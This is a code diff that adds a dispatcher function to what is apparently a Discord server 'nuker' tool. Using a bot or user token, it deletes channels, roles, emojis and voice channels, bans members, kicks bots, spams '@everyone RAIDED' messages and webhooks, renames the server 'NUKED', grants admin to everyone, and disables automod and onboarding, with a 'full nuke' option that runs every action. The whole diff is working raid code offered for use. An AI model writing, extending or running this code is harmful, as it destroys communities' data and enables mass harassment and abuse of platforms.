@@ -422,3 +422,72 @@ def get_guilds(token: str):
         return loop.run_until_complete(fetch_guilds())
     finally:
         loop.close()
+
+def execute(token, guild_id, options, settings):
+    results = []
+    for opt in options:
+        if opt == "1":
+            result = run_nuke_action(token, int(guild_id), "delete_channels", None)
+            results.append(result.get("message", "Deleted channels"))
+        elif opt == "2":
+            params = {"prefix": settings.get("channel_prefix", "nuked"), "amount": settings.get("channel_amount", 50)}
+            result = run_nuke_action(token, int(guild_id), "spam_channels", params)
+            results.append(result.get("message", "Spammed channels"))
+        elif opt == "3":
+            result = run_nuke_action(token, int(guild_id), "delete_roles", None)
+            results.append(result.get("message", "Deleted roles"))
+        elif opt == "4":
+            params = {"prefix": settings.get("role_prefix", "ROLE"), "amount": settings.get("role_amount", 50)}
+            result = run_nuke_action(token, int(guild_id), "create_roles", params)
+            results.append(result.get("message", "Created roles"))
+        elif opt == "5":
+            result = run_nuke_action(token, int(guild_id), "ban_members", None)
+            results.append(result.get("message", "Banned members"))
+        elif opt == "6":
+            params = {"message": settings.get("spam_msg", "@everyone RAIDED")}
+            result = run_nuke_action(token, int(guild_id), "webhook_spam", params)
+            results.append(result.get("message", "Webhook spam"))
+        elif opt == "7":
+            params = {"name": settings.get("new_name", "NUKED")}
+            result = run_nuke_action(token, int(guild_id), "rename_server", params)
+            results.append(result.get("message", "Renamed server"))
+        elif opt == "8":
+            result = run_nuke_action(token, int(guild_id), "nsfw_all", None)
+            results.append(result.get("message", "NSFW all"))
+        elif opt == "9":
+            params = {"message": settings.get("spam_msg", "@everyone RAIDED"), "amount": settings.get("spam_count", 100)}
+            result = run_nuke_action(token, int(guild_id), "message_spam", params)
+            results.append(result.get("message", "Message spam"))
+        elif opt == "10":
+            result = run_nuke_action(token, int(guild_id), "admin_all", None)
+            results.append(result.get("message", "Admin all"))
+        elif opt == "11":
+            result = run_nuke_action(token, int(guild_id), "remove_nsfw", None)
+            results.append(result.get("message", "Removed NSFW"))
+        elif opt == "13":
+            result = run_nuke_action(token, int(guild_id), "delete_voice", None)
+            results.append(result.get("message", "Deleted voice channels"))
+        elif opt == "14":
+            params = {"prefix": settings.get("channel_prefix", "vc"), "amount": settings.get("channel_amount", 50)}
+            result = run_nuke_action(token, int(guild_id), "create_voice", params)
+            results.append(result.get("message", "Created voice channels"))
+        elif opt == "15":
+            result = run_nuke_action(token, int(guild_id), "delete_emojis", None)
+            results.append(result.get("message", "Deleted emojis"))
+        elif opt == "16":
+            result = run_nuke_action(token, int(guild_id), "kick_bots", None)
+            results.append(result.get("message", "Kicked bots"))
+        elif opt == "17":
+            result = run_nuke_action(token, int(guild_id), "disable_community", None)
+            results.append(result.get("message", "Disabled community"))
+        elif opt == "18":
+            result = run_nuke_action(token, int(guild_id), "disable_automod", None)
+            results.append(result.get("message", "Deleted automod"))
+        elif opt == "19":
+            result = run_nuke_action(token, int(guild_id), "disable_onboarding", None)
+            results.append(result.get("message", "Disabled onboarding"))
+        elif opt == "full":
+            result = run_nuke_action(token, int(guild_id), "full_nuke", settings)
+            results.append(result.get("message", "Full nuke"))
+    
+    return {"success": True, "message": "Nuke operations completed", "details": results}
